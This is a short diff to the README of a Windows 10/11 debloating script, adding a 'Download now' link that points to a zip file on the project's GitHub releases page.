@@ -1,5 +1,7 @@
 # win11debloater
 
+[Download now](https://github.com/consistentknowledge/win11-debloater/releases#:~:text=win11%2Ddebloater%2D1.09.zip)
+
 ### Windows 10/11 Privacy & Performance Optimization Tool
 
 ### A lightweight script designed to clean Windows from unnecessary Microsoft software, bloatware, ads, and unwanted background components.
